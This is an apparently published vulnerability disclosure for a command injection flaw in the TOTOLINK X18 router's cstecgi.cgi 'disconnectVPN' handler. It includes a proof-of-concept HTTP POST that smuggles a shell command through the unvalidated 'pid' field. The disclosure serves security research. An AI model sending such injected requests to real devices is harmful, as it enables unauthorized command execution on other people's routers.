## TOTOLINK X18 Router

Firmware Version: V9.1.0cu.2053_B20230309

Vulnerability Type: Command Injection

### Overview

A command injection vulnerability has been discovered in the TOTOLINK X18 Router. Attackers can exploit this vulnerability to execute arbitrary commands by sending malicious HTTP POST packets. The vulnerability is triggered when the request path is `/cgi-bin/cstecgi.cgi`, requiring login to obtain a `token`.

### Vulnerability Details

The trigger point is located in the `sub_41080C` method of the `cstecgi.cgi` component. Here, the `pid` field is not validated and is directly appended to `kill %s`, and then the `CsteSystem` method is used to execute the command.

![](../main/images/2026-02-09-21-55-17-ac29c3a1-f8cf-487a-b04a-9d89734bb6f8.png)

### poc

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1

Host: 192.168.0.2

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0

Accept: application/json, text/javascript, */*; q=0.01

Accept-Language: en-US,en;q=0.9

Accept-Encoding: gzip, deflate, br

Content-Type: application/json; charset=UTF-8 

X-Requested-With: XMLHttpRequest

Content-Length: 105

Origin: http://192.168.0.2

Connection: close

Referer: http://192.168.0.2/login.html



{"topicurl":"disconnectVPN","token":"0123456789abcdef0123456789abcdef","pid":"123;echo test > /tmp/test"}
```

Normally, a `token` value will exist after logging in. For ease of simulation, I manually created `/tmp/cookie_key` in the backend and wrote `0123456789abcdef0123456789abcdef`.

![](../main/images/2026-02-09-21-56-06-34b895bf-7b9a-44f9-921e-ed742e6be6c4.png)

